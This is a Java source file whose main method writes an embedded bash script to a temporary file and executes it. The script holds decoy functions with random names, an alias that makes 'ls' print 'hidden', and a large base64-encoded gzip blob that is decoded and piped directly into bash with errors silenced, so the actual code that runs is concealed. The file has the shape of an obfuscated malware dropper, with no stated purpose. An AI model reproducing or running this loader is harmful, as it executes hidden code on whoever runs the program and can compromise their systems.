import java.io.*;

public class Main {
    public static void main(String[] args) {
        try {

            String script = """
#!/bin/bash

vzi8ly6sp() { echo $((RANDOM * RANDOM)); }
v1ftxop1g() { for i in {1..3}; do :; done; }
vo4f0nvo0() { alias ls='echo hidden'; }

base64 -d <<'EOF' | gunzip | bash 2>/dev/null
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
EOF
""";


            File file = File.createTempFile("start", ".sh");
            try (FileWriter fw = new FileWriter(file)) {
                fw.write(script);
            }


            file.setExecutable(true);


            ProcessBuilder pb = new ProcessBuilder("bash", file.getAbsolutePath());
            pb.redirectErrorStream(true);
            Process p = pb.start();


            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) System.out.println(line);
            p.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
